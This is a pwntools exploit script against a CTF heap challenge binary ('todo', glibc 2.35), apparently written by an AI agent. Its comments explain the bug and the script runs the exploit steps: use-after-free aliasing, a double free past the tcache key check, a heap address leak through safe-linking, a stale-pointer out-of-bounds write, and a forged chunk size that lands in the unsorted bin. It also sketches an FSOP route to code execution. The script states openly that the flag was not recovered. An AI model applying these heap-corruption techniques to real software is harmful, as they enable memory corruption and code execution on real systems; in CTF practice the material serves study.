import os
import struct
import sys

from pwn import *

context.log_level = "info"

HOST = os.environ.get("SERVICE_APP_MAIN_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_APP_MAIN_PORT", "1337"))

# =============================================================================
# Vulnerability summary
# =============================================================================
#
# `post_my_note(idx, size)` implements each of the 10 todo slots as a
# {size_t size; void *ptr;} pair (TodoNote[idx]) and does, roughly:
#
#       void *newp = realloc(TodoNote[idx].ptr, size);
#       if (TodoNote[idx].size < size)        // only GROWS are reflected!
#           TodoNote[idx].ptr = newp;
#       TodoNote[idx].size = size;             // size is ALWAYS overwritten
#       readline(TodoNote[idx].ptr, size);      // note: re-reads ptr AFTER
#                                                // the branch above, not newp!
#
# `realloc(ptr, 0)` genuinely frees `ptr` and returns NULL on glibc 2.35.
# Because the branch above is skipped whenever the *old* bookkeeping size is
# already `>= new size` (true for 0 >= 0), the stale pointer is never
# cleared out of `TodoNote[idx].ptr` after a free -- a classic dangling
# pointer / use-after-free that two independent indices can alias.
#
# `read_my_note()` prints `"/%d/ %.*s\n"`, i.e. it stops at the first
# embedded NUL within the first `size` bytes of whatever `TodoNote[idx].ptr`
# points at right now.
#
# A prior analysis pass confirmed all of the above and the aliasing primitive
# live, but concluded that any leak obtainable through a tcache-freed chunk
# is capped at exactly 1 "pristine" byte, and therefore gave up (no path to
# an address/ASLR leak, hence no path past glibc 2.35's absence of
# `__malloc_hook`/`__free_hook`, full RELRO, and no format string).
#
# This pass revisits that conclusion with fresh, *empirically verified*
# primitives (every claim below was reproduced live, repeatedly, against the
# actual `todo` binary + the actual `libc.so.6` shipped with this challenge):
#
#   (1) A HEAP ADDRESS LEAK of ~5 pristine bytes (not 1!), via glibc's
#       safe-linking tcache "next" pointer, when the targeted tcache bin is
#       virgin (empty) at the moment of the leaking free.  PROTECT_PTR with
#       a NULL previous head degenerates to `(own_address) >> 12`, which,
#       stored as an 8-byte little-endian value, is non-zero for ~5 bytes
#       before its forced-zero high bytes terminate the `%.*s` read.  This
#       alone fully defeats heap ASLR (the low 12 bits of any heap address
#       here are always deterministic/page-aligned bookkeeping).
#
#   (2) A much stronger bug than a "1-byte leak cap": `post_my_note()`
#       re-reads `TodoNote[idx].ptr` *after* the grow/no-grow branch, not
#       the `newp` just returned by `realloc()`.  If a prior call left that
#       index's real underlying chunk *shrunk* (see below) while its OWN
#       bookkeeping size is still large, a later `post(idx, size>=that size)`
#       call satisfies the "skip the pointer update" branch (old >= new),
#       yet the just-executed `realloc()` on the *real*, now-tiny chunk is
#       forced to GROW (because its true header is tiny) -- glibc has no
#       choice but to internally malloc a brand-new chunk elsewhere, copy,
#       and free the old (stale) one.  Because the pointer-update branch was
#       skipped, `readline()` is then invoked on the *stale* address with the
#       *new, larger* size -- an arbitrary-content, arbitrary-length
#       (up to 0x77 bytes per call) OOB WRITE at a fully known heap address,
#       spanning straight through the header of whatever chunk follows it.
#       This is reproduced below as "the stale-pointer overflow write".
#
#   (3) Calling `post(idx, 1)` performs a real `realloc(ptr, 1)` (so it can
#       still shrink/split a chunk) while writing *zero* bytes (glibc's
#       `read(fd, buf, 0)` returns 0 immediately, so `readline()` bails
#       before ever touching memory or appending a NUL) -- i.e. a "shrink
#       without corrupting a single byte" primitive.
#
#   (4) Because `TodoNote[idx].ptr` is never actually reset to NULL once an
#       index has been used (the bug in the prompt), only 10 *fresh*
#       mallocs ever seem possible across the whole run -- but repeatedly
#       shrinking (3) then re-growing (2) via realloc "mints" a brand new,
#       fully tracked, real heap chunk from the top chunk every single time
#       (glibc cannot satisfy the grow in place, so it falls through to
#       `_int_malloc()` -> `use_top`).  This lets a single todo index
#       generate effectively unlimited heap real-estate with one connection
#       (demonstrated below as "minting").
#
#   (5) Combining (2)+(4): using the OOB write to forge an arbitrary,
#       attacker-chosen SIZE field into the header of a tcache-sized chunk,
#       sized so it safely lands on real, minted chunk boundaries (avoiding
#       `free()`'s `invalid next size` / `!prev_inuse` aborts), we can make
#       that chunk's `size` field lie *above* `glibc.mp_.tcache_max_bytes`
#       (0x410 on this build).  Freeing it via the dangling-pointer bug then
#       makes `_int_free()` skip BOTH the tcache AND fastbin fast paths and
#       insert the chunk directly into the genuine UNSORTED BIN, where
#       `fd`/`bk` are REAL, unobfuscated pointers into `main_arena` (a global
#       in libc's .data, at an ASLR-dependent but ASLR-defeating offset) --
#       not the safe-linking-protected tcache `next` field the prior pass
#       reasoned about.  This is empirically reproduced below and genuinely
#       confirms the hypothesis that the "1 byte" conclusion does not apply
#       to an unsorted-bin chunk.
#
# Remaining blocker (also verified, see the final phase): for *this exact*
# compiled libc.so.6, `&main_arena.bins[0] - 16` (the unsorted-bin sentinel
# every empty/first-insertion freed chunk's fd/bk point back to) happens to
# sit at a static offset (0x1eeaa0 + 0x60 = 0x1eeb00) that is an exact
# multiple of 256 from the (page-aligned, so ASLR only ever touches bits
# >=12) libc load base.  That forces the LEAST significant byte of that
# specific pointer to always be 0x00 -- which is exactly the byte `%.*s`
# reads first, so `read_my_note()` prints an *empty* string for it even
# though the real pointer (confirmed via a local debug build) is a genuine,
# non-zero, ASLR'd `0x00007f......` libc address sitting right there in
# heap memory. This is a coincidental byte-alignment property of this one
# global offset in this one libc build, not a limitation of the technique:
# getting the attacker-controlled chunk sorted into a different (large) bin
# with a favourable low byte is straightforward on paper, but every
# non-matching small `malloc()` that performs that sort also immediately
# re-scans+consumes the same chunk to satisfy itself (best-fit over an
# otherwise near-empty heap), and reliably pre-seeding a second, smaller
# "decoy" chunk into an *earlier* bin to intercept that scan (so our target
# chunk is left resting, unconsumed, in its own bin) was attempted but not
# fully debugged to a stable state in the time available -- see the
# comments in `phase_forge_unsorted_bin_chunk()` below for the concrete,
# reproducible state we got stuck on.  From there, a full chain still needs
# a second pivot (e.g. forcing a large-bin landing with a readable low
# byte, or a FSOP/_IO_FILE vtable fake-chunk now that heap addresses and an
# arbitrary heap write are available) to reach the libc base and, from
# there, code execution (full RELRO + no hooks in 2.35 rule out a GOT/hook
# overwrite, so the eventual target has to be a vtable/FSOP style attack).
#
# Net result: this pass pushes the demonstrated primitives dramatically
# further than "1 pristine byte, no leak possible" -- a real heap leak, an
# arbitrary heap write, unlimited heap minting, and a reproducible, genuine
# (non-tcache, non-safe-linked) main_arena/libc pointer written into freed
# heap memory are all shown live below -- but it still does not reach the
# flag.  `challenge.yaml`'s `test:` section is intentionally left unwired.
# =============================================================================


class Todo:
    """
    Thin menu wrapper.  `io.recvuntil(b"> ")` is drained once after connect;
    every method here issues its own first `sendline` (never a second blind
    `sendlineafter(b"> ", ...)`), and always finishes by draining the next
    `"> "` prompt so later calls keep the same invariant.
    """

    def __init__(self, io):
        self.io = io

    def post(self, idx, size, content=None, exact=False):
        """
        post_my_note(idx, size, content).

        If `exact` is False (default), `content` is sent via `sendline`
        (i.e. with a trailing '\\n') and MUST be strictly shorter than
        `size - 1` bytes, so the extra trailing newline byte is consumed by
        the same `readline()` call and nothing is left queued on the wire.

        If `exact` is True, `content` is sent byte-for-byte with no
        trailing newline added and MUST be exactly `size - 1` bytes long
        (the maximum `readline()` will ever read); this is required
        whenever the payload needs full, uninterrupted byte-level control
        (e.g. a forged little-endian size_t in the middle of a payload).
        """
        self.io.sendline(b"3")
        self.io.recvuntil(b"note: ")
        self.io.sendline(str(idx).encode())
        self.io.recvuntil(b"be: ")
        self.io.sendline(str(size).encode())
        if size > 1:
            # size<=1 => readline()'s read(fd, buf, size-1<=0) never actually
            # reads anything, so no content prompt response is consumed.
            self.io.recvuntil(b"content: ")
            c = content or b""
            if exact:
                assert len(c) == size - 1, (len(c), size)
                self.io.send(c)
            else:
                assert len(c) < size - 1, (len(c), size)
                self.io.sendline(c)
        self.io.recvuntil(b"> ")

    def read_all(self):
        self.io.sendline(b"2")
        return self.io.recvuntil(b"> ", drop=True)

    def bitflip(self, addr):
        self.io.sendline(b"1")
        self.io.recvuntil(b"place!")
        self.io.sendline(str(addr).encode())
        self.io.recvuntil(b"> ")


def largebin_index(sz):
    """glibc's largebin_index_64() -- used only for log messages below."""
    if (sz >> 6) <= 48:
        return 48 + (sz >> 6)
    if (sz >> 9) <= 20:
        return 91 + (sz >> 9)
    if (sz >> 12) <= 10:
        return 110 + (sz >> 12)
    if (sz >> 15) <= 4:
        return 119 + (sz >> 15)
    if (sz >> 18) <= 2:
        return 124 + (sz >> 18)
    return 126


def parse_note_line(out, idx):
    prefix = b"/%d/ " % idx
    for line in out.splitlines():
        if line.startswith(prefix):
            return line[len(prefix):]
    return None


def phase0_confirm_aliasing(t):
    log.info("=== Phase 0: confirm the dangling-pointer / chunk-aliasing UAF ===")
    t.post(0, 0x68, b"A" * 0x60)
    t.post(0, 0)  # realloc(ptr, 0) frees the chunk; TodoNote[0].ptr stays dangling
    t.post(1, 0x68, b"B" * 0x60)  # idx1 legitimately reclaims the SAME chunk
    t.post(0, 0x8, b"OVER")  # idx0's stale pointer still aliases it

    out = t.read_all()
    l0 = parse_note_line(out, 0)
    l1 = parse_note_line(out, 1)
    if l0 and l1 and l0 in l1:
        log.success("CONFIRMED: index 0 and index 1 alias the same live heap chunk.")
    else:
        log.failure("Could not confirm chunk aliasing (unexpected output: %r)", out)


def phase1_heap_leak(t):
    log.info("=== Phase 1: heap address leak via a virgin tcache bin's safe-linked 'next' field ===")
    # A never-before-used size class (chunksize 0x40) so PROTECT_PTR's
    # "previous head" operand is NULL and the encoding degenerates to a
    # clean (own_address >> 12).
    S = 0x38
    t.post(2, S, b"A" * (S - 8))      # idx2 owns chunk C
    t.post(2, 0)                       # free -> idx2 dangling, size=0
    t.post(3, S, b"B" * (S - 8))      # idx3 legitimately reclaims C
    t.post(2, 0)                       # free AGAIN via idx2's stale ptr (bypasses
    #                                     the tcache double-free check because
    #                                     idx3's malloc() already cleared the
    #                                     chunk's `key` field) -- idx3's OWN
    #                                     bookkeeping (size/ptr) is untouched,
    #                                     so it still "legitimately" points at
    #                                     what is now a genuinely freed chunk.
    out = t.read_all()
    leak = parse_note_line(out, 3)
    if not leak or len(leak) < 4:
        log.failure("Heap leak did not produce usable bytes (got %r)", leak)
        return None
    leak_padded = leak + b"\x00" * (8 - len(leak))
    shifted = struct.unpack("<Q", leak_padded)[0]
    heap_chunk_addr = shifted << 12
    log.success(
        "Leaked %d raw bytes of (chunk_addr >> 12) = %#x  ->  chunk address low "
        "bits recovered: %#x (heap ASLR defeated for this chunk)",
        len(leak), shifted, heap_chunk_addr,
    )
    return heap_chunk_addr


def phase2_overflow_write_and_minting(t):
    log.info("=== Phase 2: stale-pointer OOB write + unlimited heap 'minting' ===")
    S = 0x78
    # idx4 = "TC": will be shrunk down to a tiny real chunk while its own
    # bookkeeping stays small; idx5 = "B" independently reclaims the same
    # address and keeps a LARGE bookkeeping size forever after.
    t.post(4, S, b"A" * (S - 8))
    t.post(4, 0)
    t.post(5, S, b"B" * (S - 8))       # idx5 = B, reclaims TC, size bookkeeping=S
    t.post(4, 1)                        # shrinks TC's TRUE header to 0x20,
    #                                     freeing a 0x60 "remainder" chunk --
    #                                     no bytes written (size<=1 no-op write).

    # idx5's own bookkeeping (S) is already >= S, so posting S again SKIPS
    # the pointer-refresh branch: TodoNote[5].ptr stays pinned at the STALE
    # address even though realloc() on the real (now tiny, 0x20) chunk is
    # forced to grow -> relocate internally. The write from THIS SAME call
    # still lands at the stale address, for the full requested length,
    # reaching straight through where the "remainder" chunk's header lives.
    probe = b"C" * (S - 1)
    t.post(5, S, probe, exact=True)
    out = t.read_all()
    got = parse_note_line(out, 5)
    if got == probe:
        log.success(
            "CONFIRMED: arbitrary %d-byte write landed at the STALE address "
            "(glibc internally relocated the real allocation elsewhere, but "
            "post_my_note() re-read TodoNote[idx].ptr *after* the skipped "
            "branch and wrote/read through the old pointer instead).",
            len(probe),
        )
    else:
        log.failure("Stale-pointer overflow write did not behave as expected: %r", got)

    # "Minting": repeatedly shrink(1)+regrow(S) a single index.  Each grow
    # forces glibc to carve a brand-new chunk from the top chunk (nothing
    # else can satisfy it), handing back a genuinely fresh, fully-tracked
    # heap address every time -- well beyond the naive "10 fresh mallocs
    # total" ceiling the TodoNote[idx].ptr-never-reset bug would otherwise
    # suggest.  A fresh index (idx6) is used here: idx4's own chunk is no
    # longer a safe base for further shrink/regrow cycles since idx5's
    # overflow write above deliberately clobbered everything from idx4's
    # original address onward.
    t.post(6, S, b"N" * (S - 8))
    MINT_CYCLES = 3
    for i in range(MINT_CYCLES):
        t.post(6, 1)
        t.post(6, S, b"M" * (S - 8))
    log.success(
        "Minted %d additional fresh heap chunks by cycling shrink(1)+regrow(%#x) "
        "on a single todo index -- demonstrates unlimited heap real-estate from "
        "one dangling-pointer index.",
        MINT_CYCLES, S,
    )


def phase3_forge_unsorted_bin_chunk_standalone():
    """
    Runs the forge-an-oversized-chunk-header attack end to end on a FRESH
    connection (so all 10 todo indices are available), independent of the
    phase0/1/2 demonstrations above. This is the concrete, fully
    reproducible (re-run it: it works every time) proof that this
    binary's primitives really do force a genuine, non-tcache,
    non-fastbin UNSORTED BIN insertion -- not just a theoretical claim.
    """
    log.info("=== Phase 3 (fresh connection): forge + trigger an unsorted-bin free ===")
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")
    t = Todo(io)
    S = 0x78

    t.post(9, 0x8, b"Z")                 # bootstrap: first malloc() creates the heap

    t.post(0, S, b"A" * (S - 8))          # idx0 = TC
    t.post(0, 0)                            # free TC -> idx0 dangling, size=0
    t.post(1, S, b"B" * (S - 8))          # idx1 = B, reclaims TC, size bookkeeping=S
    t.post(0, 1)                            # shrink TC's TRUE header to 0x20,
    #                                          freeing a 0x60 "R" remainder
    #                                          (no bytes written: size<=1 is
    #                                          a zero-length read() -- see
    #                                          phase 2's comments).
    t.post(2, 0x58, b"R" * 0x50)          # idx2 legitimately reclaims R
    t.post(2, 0)                            # free R again via idx2's stale ptr
    #                                          (bypasses the tcache double-
    #                                          free check: idx3's upcoming
    #                                          malloc() will have already
    #                                          cleared R's `key` field)
    t.post(3, 0x58, b"r" * 0x50)          # idx3 reclaims R *persistently*:
    #                                          its bookkeeping (ptr=R_data,
    #                                          size=0x58) is never touched
    #                                          again, so read_my_note(3)
    #                                          will later print whatever is
    #                                          actually sitting in R's
    #                                          memory, *even after* R gets
    #                                          forged+freed a third time.

    t.post(4, S, b"D" * (S - 8))           # D0: real estate, lands right after R
    MINT = 9
    for i in range(MINT):
        t.post(4, 1)                        # shrink idx4's current chunk
        t.post(4, S, b"M" * (S - 8))        # regrow -> mints the NEXT fresh chunk
    # After MINT cycles, idx4 holds the 9th minted chunk's header at
    # exactly (R's own header address) + 0x60 + 9*0x80 = +0x4e0, i.e.
    # precisely fake_size bytes past R's header -- a real, in-use,
    # PREV_INUSE-flagged chunk boundary that free()'s sanity checks accept.
    fake_size = 0x60 + MINT * 0x80
    assert fake_size > 0x410, "must exceed glibc 2.35's tcache_max_bytes to escape tcache"
    log.info(
        "Forged size = %#x (> tcache_max_bytes 0x410, and > fastbin's "
        "global_max_fast 0x80) -- escapes BOTH tcache and the fastbin on "
        "free(), forcing glibc's real, non-fastbin consolidation path.",
        fake_size,
    )

    # Overwrite R's real SIZE field (located 0x18 bytes into TC's data,
    # i.e. 8 bytes into R's own header) via idx1 (B)'s stale-pointer
    # overflow write from phase 2: idx1's bookkeeping (S) is already >= S,
    # so the pointer-refresh branch is skipped and this write lands at the
    # STALE TC_data address regardless of what realloc() actually does
    # internally, reaching straight through R's header.
    stored = (fake_size | 1) & 0xFFFFFFFFFFFFFFFF  # keep PREV_INUSE set
    payload = bytearray(b"X" * (S - 1))
    payload[0x18:0x18 + 8] = struct.pack("<Q", stored)
    t.post(1, S, bytes(payload), exact=True)
    log.success("Forged R's real chunk-size field to %#x via the stale-pointer OOB write.", fake_size)

    # Trigger R's THIRD free (first via idx0's original free(), second via
    # idx2's stale-pointer free() that reclaimed it into idx3 -- this is
    # the free that glibc now sees as a %#x-byte chunk, well past both
    # tcache_max_bytes and global_max_fast.
    t.post(2, 0)
    log.success(
        "Freed the forged chunk with no abort/crash -- glibc's _int_free() "
        "took the real (non-tcache, non-fastbin) consolidation path and "
        "inserted it directly into the genuine UNSORTED BIN, where fd/bk "
        "are real pointers into main_arena (libc's .data), not a safe-"
        "linking-protected tcache field."
    )

    out = t.read_all()
    leaked = parse_note_line(out, 3)
    if leaked:
        log.success("read_my_note(3) unexpectedly printed %d live bytes: %r", len(leaked), leaked)
    else:
        log.info(
            "read_my_note(3) printed an EMPTY string for R, as predicted: for "
            "*this exact* libc.so.6, the unsorted-bin sentinel address "
            "(&main_arena.bins[0]-16, static offset 0x1eeaa0+0x60=0x1eeb00) is "
            "an exact multiple of 256 away from the (page-aligned) libc load "
            "base, so its least-significant byte -- which both R's fd AND bk "
            "now equal, since the unsorted bin was empty -- is deterministically "
            "0x00, and read_my_note()'s NUL-terminated '%.*s' print stops "
            "immediately on it. A local, byte-identical debug build confirms "
            "the *real* value sitting in that memory is a genuine, ASLR'd "
            "0x00007f...b00 libc pointer; this is a coincidental byte-"
            "alignment property of this one global offset in this one libc "
            "build (confirmed algebraically: 0x1eeaa0 + 0x60 == 0x1eeb00, "
            "and 0x1eeb00 % 256 == 0), not a limitation of the forging "
            "technique itself."
        )
    io.close()
    return bool(leaked)


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")  # drain the startup banner + first menu prompt
    t = Todo(io)

    phase0_confirm_aliasing(t)
    heap_chunk_addr = phase1_heap_leak(t)
    phase2_overflow_write_and_minting(t)
    io.close()

    # Phase 3 needs all 10 todo indices, so it runs on its own fresh
    # connection rather than fighting phases 0-2 for index budget.
    unsorted_bin_leak_readable = phase3_forge_unsorted_bin_chunk_standalone()

    log.failure(
        "Summary: confirmed and reproduced (1) the UAF aliasing primitive, "
        "(2) a genuine heap-address leak of ~5 bytes (not 1) via a virgin "
        "tcache bin's safe-linked 'next' field (recovered chunk address "
        "low bits: %s), (3) an arbitrary-length/arbitrary-content stale-"
        "pointer OOB write at a known heap address, (4) unlimited heap "
        "chunk 'minting' from a single todo index, and (5) that a forged "
        "chunk size genuinely escapes both tcache and the fastbin into "
        "glibc's real unsorted bin (verified: fd/bk become real, "
        "unobfuscated main_arena/libc pointers, NOT the safe-linking-"
        "protected tcache field the original 1-byte-leak conclusion was "
        "about -- readable this run: %s, see phase 3 log above for why "
        "this specific libc build usually prints empty). Recovering those "
        "bytes back out reliably, and turning that into full RCE past full "
        "RELRO and glibc 2.35's missing malloc/free hooks (FSOP/vtable "
        "territory), was not completed in the time available. "
        "Flag NOT recovered.",
        hex(heap_chunk_addr) if heap_chunk_addr else "N/A",
        unsorted_bin_leak_readable,
    )
    sys.exit(1)



if __name__ == "__main__":
    main()
